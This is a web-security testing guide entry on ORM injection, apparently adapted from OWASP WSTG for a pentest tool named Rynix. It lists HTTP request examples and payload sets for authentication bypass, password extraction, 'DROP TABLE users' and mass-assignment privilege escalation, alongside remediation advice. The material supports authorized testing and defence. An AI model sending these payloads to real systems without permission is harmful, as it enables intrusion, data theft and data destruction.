---
id: WSTG-INPV-07
title: Testing for ORM Injection
category: Input Validation
severity_range: Medium-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection
---

# WSTG-INPV-07: Testing for ORM Injection

## Summary

ORM (Object-Relational Mapping) Injection occurs when user input is unsafely incorporated into ORM query methods. While ORMs like Hibernate (Java), SQLAlchemy (Python), ActiveRecord (Ruby), Entity Framework (.NET), Sequelize (Node.js), and Doctrine (PHP) are designed to abstract away raw SQL, they can still be vulnerable when developers use raw query methods, string interpolation in query builders, or unsafe filter expressions. ORM injection can lead to data extraction, authentication bypass, and in some cases, remote code execution through second-order SQL injection or ORM-specific query language abuse (HQL, DQL, JPQL, etc.).

## Test Objectives

- Identify parameters processed through ORM query methods
- Test if ORM query languages (HQL, DQL, JPQL) are susceptible to injection
- Determine if raw query methods or unsafe query construction is in use
- Assess whether ORM-specific features can be abused for data access or manipulation

## Prerequisites

- Target application uses an ORM framework for database interactions
- Application entry points have been mapped (WSTG-INFO-06)
- Docker pentest container capturing traffic
- Ideally, knowledge of the backend technology stack and ORM in use

## Test Steps

### Step 1: Identify ORM Technology and Injection Points

**CLI Actions:**
1. Use `curl` to identify endpoints that interact with data (CRUD operations, search, filtering, sorting)
2. Use `curl` with pattern `(filter|sort|order|search|query|find|where|select|field)` to find potential ORM query parameters
3. Look for error messages that reveal the ORM in use:
   - `org.hibernate` - Hibernate (Java)
   - `sqlalchemy` - SQLAlchemy (Python)
   - `ActiveRecord` - Rails (Ruby)
   - `Sequelize` - Sequelize (Node.js)
   - `Doctrine` - Doctrine (PHP)
   - `EntityFramework` - Entity Framework (.NET)
4. Use `save to manual-review file` for each candidate endpoint

### Step 2: Test for HQL/JPQL Injection (Hibernate/JPA)

**CLI Actions:**
Use `curl` to inject HQL/JPQL syntax:

**Basic injection test:**
```
GET /users?name=admin' OR '1'='1 HTTP/1.1
Host: target.com
```

**HQL-specific injection:**
```
GET /users?sort=name ASC, (CASE WHEN 1=1 THEN name ELSE email END) HTTP/1.1
Host: target.com
```

**JPQL function injection:**
```
GET /users?filter=name=' OR name LIKE '%25 HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` for special characters as needed.

### Step 3: Test for SQLAlchemy Injection (Python)

**CLI Actions:**
Use `curl` to test for unsafe SQLAlchemy filter expressions:

**Operator injection:**
```
GET /api/users?filter={"name": {"$ne": ""}} HTTP/1.1
Host: target.com
```

**Raw SQL in filter:**
```
GET /api/users?order=name; DROP TABLE users-- HTTP/1.1
Host: target.com
```

**Text clause injection:**
```
GET /api/users?sort=name DESC; SELECT password FROM users-- HTTP/1.1
Host: target.com
```

### Step 4: Test for ActiveRecord Injection (Ruby on Rails)

**CLI Actions:**
Use `curl` to test unsafe ActiveRecord conditions:

**Hash condition bypass:**
```
GET /users?user[name]=admin&user[password][$ne]= HTTP/1.1
Host: target.com
```

**Where clause injection:**
```
GET /users?search=admin' OR '1'='1 HTTP/1.1
Host: target.com
```

**Order clause injection:**
```
GET /users?sort=name; SELECT pg_sleep(5)-- HTTP/1.1
Host: target.com
```

### Step 5: Test for Sequelize Injection (Node.js)

**CLI Actions:**
Use `curl` to test Sequelize operator injection:

**Operator injection via JSON:**
```
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "admin", "password": {"$gt": ""}}
```

```
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": {"$like": "%admin%"}, "password": {"$ne": ""}}
```

**Raw query injection:**
```
GET /api/users?where=name='admin' OR 1=1-- HTTP/1.1
Host: target.com
```

### Step 6: Test for Doctrine DQL Injection (PHP)

**CLI Actions:**
Use `curl` to test DQL injection:

```
GET /users?search=admin' OR '1'='1 HTTP/1.1
Host: target.com
```

```
GET /users?filter=name=admin' OR 1=1 -- HTTP/1.1
Host: target.com
```

### Step 7: Test ORM-Specific Features

**CLI Actions:**
Use `curl` to test edge cases specific to ORM behavior:

**Nested attribute access:**
```
GET /api/users?fields[]=password&fields[]=name HTTP/1.1
Host: target.com
```

**Relationship traversal:**
```
GET /api/users?include=roles,permissions HTTP/1.1
Host: target.com
```

**Mass assignment via parameter pollution:**
```
POST /api/users HTTP/1.1
Host: target.com
Content-Type: application/json

{"name": "test", "role": "admin", "is_admin": true}
```

Use `rynix_plugin_run('template-scan')` to check if the template-scan plugin has identified any SQL or ORM injection issues.

## Payloads

### HQL/JPQL Injection Payloads
```
' OR '1'='1
' OR 1=1--
' AND SUBSTRING(name,1,1)='a
name ASC, (CASE WHEN 1=1 THEN name ELSE email END)
' OR name LIKE '%
1 AND (SELECT COUNT(*) FROM User)>0
```

### SQLAlchemy Injection Payloads
```
name; DROP TABLE users--
name DESC; SELECT password FROM users--
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}
```

### ActiveRecord Injection Payloads
```
admin' OR '1'='1
user[password][$ne]=
user[role][$gt]=
name; SELECT pg_sleep(5)--
' OR 1=1 LIMIT 1--
```

### Sequelize Operator Injection Payloads
```
{"$gt": ""}
{"$ne": ""}
{"$like": "%"}
{"$or": [{"password": {"$ne": ""}}, {"password": {"$ne": ""}}]}
{"$between": ["", "zzzzz"]}
{"$regexp": ".*"}
```

### Doctrine DQL Injection Payloads
```
' OR '1'='1
admin' OR 1=1 --
' UNION SELECT u.password FROM User u WHERE '1'='1
```

### Generic ORM Bypass Payloads
```
' OR ''='
" OR ""="
') OR ('1'='1
") OR ("1"="1
' OR 1=1#
' OR 1=1/*
```

### Mass Assignment / Over-Posting Payloads
```
{"role": "admin"}
{"is_admin": true}
{"permissions": ["admin", "superuser"]}
{"user_type": "administrator"}
{"approved": true, "verified": true}
```

## Detection Criteria

A finding should be logged when:
- ORM-specific error messages are returned (HQL, DQL, JPQL parse errors)
- Injection payloads alter query results or bypass authentication
- Operator injection via JSON modifies query semantics
- Sort/order/filter parameters allow arbitrary query manipulation
- Mass assignment allows modification of protected attributes

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Authentication bypass via ORM injection | High |
| Data extraction through injected ORM queries | High |
| Mass assignment allows privilege escalation | High |
| Blind ORM injection confirmed (boolean or time-based) | Medium |
| ORM error messages reveal internal schema or structure | Medium |
| Operator injection alters query but limited data exposure | Medium |
| ORM errors disclosed but no confirmed injection | Low |

## Remediation

- Always use parameterized queries or bound parameters in ORM methods
- Avoid passing user input to raw query methods (e.g., `raw()`, `execute()`, `text()`)
- Never interpolate user input into query strings, even within ORM APIs
- Use allowlists for sort, filter, and field selection parameters
- Implement strong parameter patterns (Rails) or DTOs (.NET) to prevent mass assignment
- Disable Sequelize operators or use an allowlist for permitted operators
- Keep ORM frameworks updated to patch known injection vectors
- Review code for unsafe query construction patterns during security audits

## References

- [OWASP Testing Guide - ORM Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-943: Improper Neutralization of Special Elements in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

